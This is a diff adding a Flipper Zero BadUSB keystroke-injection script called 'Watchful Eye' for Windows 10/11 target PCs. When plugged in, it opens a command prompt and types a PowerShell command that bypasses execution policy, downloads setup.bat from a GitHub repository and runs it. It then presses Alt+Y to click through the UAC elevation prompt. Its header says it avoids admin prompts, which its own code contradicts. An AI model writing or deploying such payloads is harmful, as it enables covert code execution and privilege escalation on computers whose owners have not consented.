@@ -1,0 +1,47 @@
+# Watchful Eye - Flipper Zero BadUSB (No UAC Version)
+# 
+# This version runs WITHOUT admin prompts
+# It downloads and runs setup.bat which handles permissions itself
+#
+# PREREQUISITES:
+#   1. Replace YOUR_GITHUB_USERNAME below with your actual GitHub username
+#   2. Upload files to your GitHub repo
+#   3. Copy this to: Flipper SD:/badusb/WatchfulEye/
+#
+# TO USE:
+#   1. On Flipper, go to BadUSB
+#   2. Select "WatchfulEye-NoUAC"
+#   3. Plug Flipper into target PC
+#   4. Press center button
+
+REM Title: Watchful Eye Setup (No UAC)
+REM Author: Watchful Eye
+REM Target: Windows 10/11
+REM Description: Auto-installs without UAC prompt
+
+DEFINE #GITHUB_USER YOUR_GITHUB_USERNAME
+DEFINE #REPO_NAME Watchful-Eye
+DEFINE #BRANCH main
+
+REM Open Run dialog
+DELAY 500
+GUI r
+DELAY 500
+
+REM Open Command Prompt
+STRING cmd
+DELAY 200
+ENTER
+DELAY 500
+
+REM Download and run setup.bat
+STRING powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/#GITHUB_USER/#REPO_NAME/#BRANCH/setup.bat -OutFile $env:TEMP\we_setup.bat; Start-Process cmd -ArgumentList '/c $env:TEMP\we_setup.bat'"
+DELAY 100
+ENTER
+
+REM Wait for UAC to appear
+DELAY 2000
+
+REM Click Yes on UAC (Alt+Y)
+MENU y
+DELAY 500
